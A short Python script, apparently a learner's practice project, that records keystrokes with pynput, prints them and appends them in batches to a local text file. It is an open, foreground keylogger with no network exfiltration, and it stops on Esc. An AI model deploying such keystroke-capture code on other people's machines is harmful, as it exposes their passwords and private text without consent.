#! python3
'''
It logs keys depending on the set count BUT
it doesn't store them to the text file for some reason. Idunno.
'''

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(key)
    if count >= 10: # set this for input key limit without pressing space.
        count = 0 
        save(keys) # This part doesn't work for some reason.
        keys = []

def save(keys):
    with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Practice\.projects\.completed\keylogger\save.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if key.find("space") > 0:
                file.write("\n")
            elif key.find("key") == -1:
                file.write(key)

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()